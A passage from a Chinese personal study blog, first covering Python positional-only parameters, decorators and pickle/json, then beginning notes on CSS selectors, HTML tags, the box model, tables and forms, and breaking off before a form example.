<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(pos_only=<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;pos_only&#x27;</span></span><br></pre></td></tr></table></figure>

<p>下面的函数定义中，<code>kwds</code> 把 <code>name</code> 当作键，因此，可能与位置参数 <code>name</code> 产生潜在冲突：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, **kwds</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br></pre></td></tr></table></figure>

<p>调用该函数不可能返回 <code>True</code>，因为关键字 <code>&#39;name&#39;</code> 总与第一个形参绑定。例如：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: foo() got multiple values <span class="keyword">for</span> argument <span class="string">&#x27;name&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>加上 <code>/</code> （仅限位置参数）后，就可以了。此时，函数定义把 <code>name</code> 当作位置参数，<code>&#39;name&#39;</code> 也可以作为关键字参数的键：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, /, **kwds</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>换句话说，仅限位置形参的名称可以在 <code>**kwds</code> 中使用，而不产生歧义。</p>
<p><strong>取自python官方文档</strong></p>
<h1 id="二、装饰器"><a href="#二、装饰器" class="headerlink" title="二、装饰器"></a>二、装饰器</h1><p>可以通过修饰去简化代码并且达到相应的目的。</p>
<h2 id="1、装饰器雏形"><a href="#1、装饰器雏形" class="headerlink" title="1、装饰器雏形"></a>1、装饰器雏形</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">guanjia</span>(<span class="params">game</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打开外挂&quot;</span>)</span><br><span class="line">        game()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;关闭外挂&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_dnf</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊！我叫赛利亚，今天又是美好的一天！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@guanjia</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_lol</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;欢迎来到英雄联盟&quot;</span>)</span><br><span class="line"></span><br><span class="line">play_lol()</span><br></pre></td></tr></table></figure>

<p>这就是一个简单的装饰器，通过这种方法就能使我们更方便的对函数进行相关的加装以及优化，</p>
<h2 id="2、装饰器的简单应用"><a href="#2、装饰器的简单应用" class="headerlink" title="2、装饰器的简单应用"></a>2、装饰器的简单应用</h2><p>在一些程序应用当中，我们会需要利用到登入的操作，这个时候我们就会想要实现，去实现什么功能之前需要先登入，这个时候装饰器就有用武之地了。不多说，直接看个小案例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">login_flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_verify</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">global</span> login_flag</span><br><span class="line">        <span class="keyword">if</span> login_flag:</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;请先登录&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;还未完成用户登录操作&#x27;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">                username = <span class="built_in">input</span>(<span class="string">&#x27;请输入用户名：&#x27;</span>)</span><br><span class="line">                password = <span class="built_in">input</span>(<span class="string">&#x27;请输入密码：&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;登录成功&#x27;</span>)</span><br><span class="line">                    login_flag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;用户名或密码错误，请重新输入&#x27;</span>)</span><br><span class="line">            ret = fn(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到首页&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的订单&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的资料&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index()</span><br><span class="line">order()</span><br><span class="line">profile()</span><br></pre></td></tr></table></figure>

<p>之后的相应是</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PS C:\VScodeproject&gt; &amp; C:/Users/ASUS/AppData/Local/Programs/Python/Python310/python.exe c:/VScodeproject/python/python-study/装饰器应用.py</span><br><span class="line">请先登录</span><br><span class="line">还未完成用户登录操作</span><br><span class="line">请输入用户名：admin</span><br><span class="line">请输入密码：<span class="number">123456</span></span><br><span class="line">登录成功</span><br><span class="line">欢迎来到首页</span><br><span class="line">欢迎来到我的订单</span><br><span class="line">欢迎来到我的资料</span><br></pre></td></tr></table></figure>

<h1 id="三、Pickle和Json模块的总结"><a href="#三、Pickle和Json模块的总结" class="headerlink" title="三、Pickle和Json模块的总结"></a>三、Pickle和Json模块的总结</h1><p>Pickle是将对象（数据）转化为字节，json是将对象（数据）转化为json格式</p>
<blockquote>
<p>1、dumps    把对象（数据）转化为字节</p>
<p>2、loads       把字节转化回对象（数据）</p>
<p>3、dump      把对象序列化成字节之后写入到文件</p>
<p>3、load         把文件中的字节反序列化成对象 </p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>java学习历程记录-前端基础</title>
    <url>/2023/11/21/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>其实java是之前一段时间学习的，但是学到一半的时候发现我的python能力不行，所以又转去学python了，然后又由于我之前没有记笔记的习惯，就导致我现在再回来看java，就基本上忘光了，所以想着借着写博客的功夫去将我的一些java学习历程记录下来，也能去好好的复习一下之前的知识。所以这篇文章并不主要是为了入门，更多的只是我自己的一个学习记录，仅限参考。</p>
<span id="more"></span>

<h1 id="一、一些基础的前端知识"><a href="#一、一些基础的前端知识" class="headerlink" title="一、一些基础的前端知识"></a>一、一些基础的前端知识</h1><h2 id="1、css中的元素选择器"><a href="#1、css中的元素选择器" class="headerlink" title="1、css中的元素选择器:"></a>1、css中的元素选择器:</h2><p>顾名思义：选择器是选取需设置样式的元素（标签），但是我们根据业务场景不同，选择的标签的需求也是多种多样的，所以选择器有很多种，因为我们是做后台开发的，所以对于css选择器，我们只学习最基本的3种。</p>
<p><strong>选择器通用语法如下</strong>：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">选择器名   &#123;</span><br><span class="line">    css样式名：css样式值;</span><br><span class="line">    css样式名：css样式值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要学习的3种选择器是元素选择器，id选择器，class选择器，语法以及作用如下：</p>
<h3 id="1-元素（标签）选择器："><a href="#1-元素（标签）选择器：" class="headerlink" title="1.元素（标签）选择器："></a><strong>1.元素（标签）选择器：</strong></h3><ul>
<li>选择器的名字必须是标签的名字</li>
<li>作用：选择器中的样式会作用于所有同名的标签上</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">元素名称 &#123;</span><br><span class="line">    css样式名:css样式值；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-id选择器"><a href="#2-id选择器" class="headerlink" title="2.id选择器:"></a><strong>2.id选择器:</strong></h3><ul>
<li>选择器的名字前面需要加上#</li>
<li>作用：选择器中的样式会作用于指定id的标签上，而且有且只有一个标签（由于id是唯一的）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#id属性值 &#123;</span><br><span class="line">    css样式名:css样式值；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#did</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-类选择器："><a href="#3-类选择器：" class="headerlink" title="3.类选择器："></a><strong>3.类选择器：</strong></h3><ul>
<li>选择器的名字前面需要加上 .</li>
<li>作用：选择器中的样式会作用于所有class的属性值和该名字一样的标签上，可以是多个</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.class属性值 &#123;</span><br><span class="line">    css样式名:css样式值；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.cls</span>&#123;</span><br><span class="line">     <span class="attribute">color</span>: green;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="2、一些常见的html标签"><a href="#2、一些常见的html标签" class="headerlink" title="2、一些常见的html标签"></a>2、一些常见的html标签</h2><h3 id="1-视频、音频标签"><a href="#1-视频、音频标签" class="headerlink" title="1). 视频、音频标签"></a><strong>1). 视频、音频标签</strong></h3><ul>
<li><p>视频标签: &lt;video&gt;</p>
<ul>
<li>属性: <ul>
<li>src: 规定视频的url</li>
<li>controls: 显示播放控件</li>
<li>width: 播放器的宽度</li>
<li>height: 播放器的高度</li>
</ul>
</li>
</ul>
</li>
<li><p>音频标签: &lt;audio&gt;</p>
<ul>
<li>属性:<ul>
<li>src: 规定音频的url</li>
<li>controls: 显示播放控件</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-段落标签"><a href="#2-段落标签" class="headerlink" title="2). 段落标签"></a><strong>2). 段落标签</strong></h3><ul>
<li><p>换行标签: &lt;br&gt;</p>
<ul>
<li>注意: 在HTML页面中,我们在编辑器中通过回车实现的换行, 仅仅在文本编辑器中会看到换行效果, 浏览器是不会解析的, HTML中换行需要通过br标签</li>
</ul>
</li>
<li><p>段落标签: &lt;p&gt;</p>
<ul>
<li>如: &lt;p&gt; 这是一个段落 &lt;&#x2F;p&gt;</li>
</ul>
</li>
</ul>
<h3 id="3-文本格式标签"><a href="#3-文本格式标签" class="headerlink" title="3). 文本格式标签"></a><strong>3). 文本格式标签</strong></h3><table>
<thead>
<tr>
<th>效果</th>
<th>标签</th>
<th>标签(强调)</th>
</tr>
</thead>
<tbody><tr>
<td>加粗</td>
<td>b</td>
<td>strong</td>
</tr>
<tr>
<td>倾斜</td>
<td>i</td>
<td>em</td>
</tr>
<tr>
<td>下划线</td>
<td>u</td>
<td>ins</td>
</tr>
<tr>
<td>删除线</td>
<td>s</td>
<td>del</td>
</tr>
</tbody></table>
<p>前面的标签 b、i、u、s 就仅仅是实现加粗、倾斜、下划线、删除线的效果，是没有强调语义的。 而后面的strong、em、ins、del在实现加粗、倾斜、下划线、删除线的效果的同时，还带有强调语义。</p>
<blockquote>
<p>注意事项: </p>
<ul>
<li><p>在HTML页面中无论输入了多少个空格, 最多只会显示一个。 可以使用空格占位符（&amp;nbsp；）来生成空格，如果需要多个空格，就使用多次占位符。</p>
</li>
<li><p>那在HTML中，除了空格占位符以外，还有一些其他的占位符(了解, 只需要知道空格的占位符写法即可)，如下：</p>
<ul>
<li><table>
<thead>
<tr>
<th align="left">显示结果</th>
<th align="left">描述</th>
<th align="left">占位符</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left">空格</td>
<td align="left">&amp;nbsp;</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">小于号</td>
<td align="left">&amp;lt;</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">大于号</td>
<td align="left">&amp;gt;</td>
</tr>
<tr>
<td align="left">&amp;</td>
<td align="left">和号</td>
<td align="left">&amp;amp;</td>
</tr>
<tr>
<td align="left">“</td>
<td align="left">引号</td>
<td align="left">&amp;quot;</td>
</tr>
<tr>
<td align="left">‘</td>
<td align="left">撇号</td>
<td align="left">&amp;apos;</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="4-布局美化"><a href="#4-布局美化" class="headerlink" title="4).布局美化"></a>4).布局美化</h3><h4 id="①盒子模型"><a href="#①盒子模型" class="headerlink" title="①盒子模型"></a>①盒子模型</h4><ul>
<li><p>盒子：页面中所有的元素（标签），都可以看做是一个 盒子，由盒子将页面中的元素包含在一个矩形区域内，通过盒子的视角更方便的进行页面布局</p>
</li>
<li><p>盒子模型组成：内容区域（content）、内边距区域（padding）、边框区域（border）、外边距区域（margin）</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/f529eda86837643eb1ca32955d5c36f6--cead--image-20230310092820616.png" alt="image-20230310092820616"></p>
<p>CSS盒子模型，其实和日常生活中的包装盒是非常类似的，就比如：</p>
<p> <img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/0f2a5351ad32ffa9c1fe2588bec73ffd--df3d--image-20230310093247265.png" alt="image-20230310093247265"></p>
<p>盒子的大小，其实就包括三个部分： border、padding、content，而margin外边距是不包括在盒子之内的。</p>
<p>盒子模型代码示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>盒子模型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;  <span class="comment">/* 宽度 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;  <span class="comment">/* 高度 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-sizing</span>: border-box; <span class="comment">/* 指定width height为盒子的高宽 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: aquamarine; <span class="comment">/* 背景色 */</span></span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span>; <span class="comment">/* 内边距, 上 右 下 左 , 边距都一行, 可以简写: padding: 20px;*/</span> </span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">10px</span> solid red; <span class="comment">/* 边框, 宽度 线条类型 颜色 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">30px</span> <span class="number">30px</span> <span class="number">30px</span> <span class="number">30px</span>; <span class="comment">/* 外边距, 上 右 下 左 , 边距都一行, 可以简写: margin: 30px; */</span></span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/4d2ca694e5a1c402d403f1a675b553da--1cdb--image-20231121183250787.png" alt="image-20231121183250787"></p>
<h4 id="②布局标签"><a href="#②布局标签" class="headerlink" title="②布局标签"></a>②布局标签</h4><ul>
<li><p>布局标签：实际开发网页中，会大量频繁的使用 div 和 span 这两个没有语义的布局标签。</p>
</li>
<li><p>标签：<div> <span></p>
</li>
<li><p>特点：</p>
<ul>
<li><p>div标签：</p>
<ul>
<li><p>一行只显示一个（独占一行）</p>
</li>
<li><p>宽度默认是父元素的宽度，高度默认由内容撑开</p>
</li>
<li><p>可以设置宽高（width、height）</p>
</li>
</ul>
</li>
<li><p>span标签：</p>
<ul>
<li><p>一行可以显示多个</p>
</li>
<li><p>宽度和高度默认由内容撑开</p>
</li>
<li><p>不可以设置宽高（width、height）</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-表格标签"><a href="#5-表格标签" class="headerlink" title="5).表格标签"></a>5).表格标签</h3><p><strong>标签：</strong></p>
<ul>
<li><p>&lt;table&gt; : 用于定义整个表格, 可以包裹多个 &lt;tr&gt;， 常用属性如下： </p>
<ul>
<li>border：规定表格边框的宽度</li>
<li>width：规定表格的宽度</li>
<li>cellspacing: 规定单元之间的空间</li>
</ul>
</li>
<li><p>&lt;tr&gt; : 表格的行，可以包裹多个 &lt;td&gt;  </p>
</li>
<li><p>&lt;td&gt; : 表格单元格(普通)，可以包裹内容 , 如果是表头单元格，可以替换为 &lt;th&gt;</p>
</li>
</ul>
<p><strong>演示：</strong></p>
<p>代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML-表格<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center; <span class="comment">/* 单元格内容居中展示 */</span></span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;0&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;600px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>序号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>品牌Logo<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>品牌名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>企业名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/huawei.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>华为<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>华为技术有限公司<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/alibaba.jpg&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>阿里<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>阿里巴巴集团控股有限公司<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开浏览器，效果如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/582d460a041f8a2b306cebd22a6333f9--f915--image-20231121183451283.png" alt="image-20231121183451283"></p>
<p>整合表格使用 table 标签包裹 , 其中的每一行数据都是一个 tr , 每一行中的每一个单元格都是一个 td , 而如果是表头单元格, 可以使用 th (具有加粗居中展示的效果)。</p>
<h3 id="6-表单标签（数据提交）"><a href="#6-表单标签（数据提交）" class="headerlink" title="6).表单标签（数据提交）"></a>6).表单标签（数据提交）</h3><p>那表单呢,在我们日常的上网的过程中,基本上每天都会遇到。比如，我们经常在访问网站时，出现的登录页面、注册页面、个人信息提交页面，其实都是一个一个的表单 。 当我们在这些表单中录入数据之后，一点击 “提交”，就会将表单中我们填写的数据采集到，并提交， 那其实这个数据呢，一般会提交到服务端，最终保存在数据库中 （后面的课程中会讲到）。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/158ab888ad88adfdda5cce236171acbc--b1b4--image-20231121183623494.png"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/f0994b8edc9b5e7ce1a8ad860729d313--0da3--image-20231121183653494.png" alt="image-20231121183653494"></p>
<p>那其实，上述的整个窗口是一个表单，而表单是一项一项的，这个我们称为表单项 或 表单元素。</p>
<ul>
<li><p>表单场景: 表单就是在网页中负责数据采集功能的，如：注册、登录的表单。 </p>
</li>
<li><p>表单标签: &lt;form&gt;</p>
</li>
<li><p>表单属性:</p>
<ul>
<li>action: 规定表单提交时，向何处发送表单数据，表单提交的URL。</li>
<li>method: 规定用于发送表单数据的方式，常见为： GET、POST。<ul>
<li>GET：表单数据是拼接在url后面的， 如： xxxxxxxxxxx?username&#x3D;Tom&amp;age&#x3D;12，url中能携带的表单数据大小是有限制的。</li>
<li>POST： 表单数据是在请求体（消息体）中携带的，大小没有限制。</li>
</ul>
</li>
</ul>
</li>
<li><p>表单项标签: 不同类型的input元素、下拉列表、文本域等。</p>
<ul>
<li>input: 定义表单项，通过type属性控制输入形式</li>
<li>select: 定义下拉列表</li>
<li>textarea: 定义文本域</li>
</ul>
</li>
</ul>
<p>示例：</p>
